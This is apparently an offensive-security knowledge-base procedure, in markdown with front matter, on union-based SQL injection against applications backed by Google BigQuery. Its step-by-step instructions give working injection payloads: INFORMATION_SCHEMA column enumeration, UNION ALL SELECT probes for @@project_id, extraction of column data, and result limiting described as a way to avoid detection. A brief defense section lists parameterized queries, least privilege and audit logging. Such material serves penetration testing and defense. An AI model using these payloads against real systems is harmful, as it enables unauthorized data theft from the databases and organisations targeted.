---
type: procedure
description: >-
  Extract sensitive information from Google BigQuery databases using union-based
  SQL injection techniques.
verified: true
submitted: false
created_at: '2023-04-06T03:56:32.365705+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
tactics:
  - '[[Execution]]'
techniques:
  - '[[Exploit Public-Facing Application]]'
sub_techniques: []
tags:
  - bigquery-union-based
  - google-bigquery-sqli
commands:
  - '[[commands/bigquery-extract-column-names]]'
  - '[[commands/bigquery-group-by-column]]'
  - '[[commands/bigquery-limit-results]]'
  - '[[commands/bigquery-union-select-column-and-constants]]'
  - '[[commands/bigquery-union-select-project-id]]'
  - '[[commands/bigquery-union-select-project-id-and-test-string]]'
platforms:
  - GCP
tools: []
validated: true
---

# BigQuery-Union-Based-SQL-Injection

## Summary

This procedure demonstrates how to perform union-based SQL injection in Google BigQuery to extract sensitive data such as column names, project IDs, and other database metadata. By injecting UNION ALL SELECT statements into a vulnerable query parameter, attackers can append malicious payloads to legitimate queries, bypassing restrictions and retrieving information from multiple tables or system variables.

## Description

Union-based SQL injection in BigQuery exploits vulnerabilities in applications that dynamically construct SQL queries without proper sanitization. When a vulnerable input is concatenated into a SELECT statement, an attacker can append a UNION ALL SELECT clause to combine results from the original query with data from other sources, such as INFORMATION_SCHEMA or system variables like @@project_id. This technique is particularly effective in BigQuery due to its support for standard SQL features, including subqueries and aliases. The attack targets web applications or APIs interacting with BigQuery datasets, allowing extraction of schema details, table contents, or configuration data. Success depends on matching the number of columns and data types between the original and injected SELECT statements. This procedure assumes the attacker has identified a blind or error-based injection point but focuses on union extraction for data retrieval.

## Requirements

1. Identification of a vulnerable input parameter in an application that queries BigQuery (e.g., via a web form or API endpoint).
2. Knowledge of the base query structure, including the number of columns in the original SELECT statement.
3. Access to a SQL injection tool or proxy like Burp Suite to craft and send payloads.
4. Basic understanding of BigQuery SQL syntax, including INFORMATION_SCHEMA access and system variables.

## Defense

- Implement parameterized queries or prepared statements in applications interacting with BigQuery to prevent injection.
- Use least privilege principles by limiting dataset and table permissions for service accounts.
- Enable BigQuery audit logging and monitor for anomalous queries, such as unexpected UNION ALL usage or access to INFORMATION_SCHEMA.
- Apply input validation, escaping, and web application firewalls (WAFs) tuned for SQL injection patterns.

## Objectives

1. Extract database schema information, such as column names from target tables.
2. Retrieve system metadata like project IDs to map the environment.
3. Append injected data to legitimate query results for exfiltration without triggering errors.
4. Confirm injection success and expand to full data dumping if possible.

## Instructions

### Step 1: Extract Column Names from Target Table

**Context**: Begin by querying the INFORMATION_SCHEMA to identify column names in the target dataset and table. This helps construct matching UNION SELECT statements with the correct number of columns.

**Command** ([[commands/bigquery-extract-column-names]]):
```sql
SELECT column_name FROM `$_PROJECT_ID.$_DATASET_NAME.INFORMATION_SCHEMA.COLUMNS` WHERE table_name = '$_TABLE_NAME'
```

> This command retrieves a list of columns from the specified table's schema. Replace placeholders with actual values. Use this in an injected payload appended to the vulnerable query.

### Step 2: Test Union Injection with Project ID Extraction

**Context**: Inject a UNION ALL SELECT using the @@project_id system variable to verify the injection point and extract the project identifier. This confirms the number of columns matches and reveals environment details.

**Command** ([[commands/bigquery-union-select-project-id]]):
```sql
UNION ALL SELECT (SELECT @@project_id), 1, 1, 1, 1, 1, 1 AS T1 GROUP BY $_COLUMN_NAME
```

> Append this to the original query after balancing columns with NULLs or constants. The GROUP BY helps in cases where aggregation is needed to avoid errors.

### Step 3: Validate with Test String and Additional Project ID

**Context**: Follow up with a test string like 'asd' alongside another project_id extraction to confirm payload execution and differentiate injected results.

**Command** ([[commands/bigquery-union-select-project-id-and-test-string]]):
```sql
UNION ALL SELECT (SELECT @@project_id), 1, 1, 1, 1, 1, 1 AS T1 GROUP BY $_COLUMN_NAME UNION ALL SELECT (SELECT 'asd'), 1, 1, 1, 1, 1, 1 AS T1 GROUP BY $_COLUMN_NAME
```

> This chained UNION tests multiple injections in one payload, helping identify which results are legitimate vs. injected.

### Step 4: Inject Column Data with Constants

**Context**: Once schema is known, select actual column data unioned with constants to extract records. Use aliases and subqueries to handle BigQuery specifics.

**Command** ([[commands/bigquery-union-select-column-and-constants]]):
```sql
UNION ALL SELECT $_COLUMN_NAME, 1, 1 FROM (SELECT $_COLUMN_NAME AS new_name FROM `$_PROJECT_ID.$_DATASET_NAME.$_TABLE_NAME`) AS A GROUP BY $_COLUMN_NAME
```

> This extracts values from the specified column while using constants to match the original query's column count.

### Step 5: Apply Grouping and Limiting

**Context**: Use GROUP BY to aggregate results if needed and LIMIT to control output size, preventing overload or detection.

**Command** ([[commands/bigquery-group-by-column]]):
```sql
GROUP BY $_COLUMN_NAME
```

> Append after SELECT to group results by the injected or target column.

**Command** ([[commands/bigquery-limit-results]]):
```sql
LIMIT $_LIMIT_COUNT
```

> Add at the end to restrict rows returned, e.g., LIMIT 1 for testing.
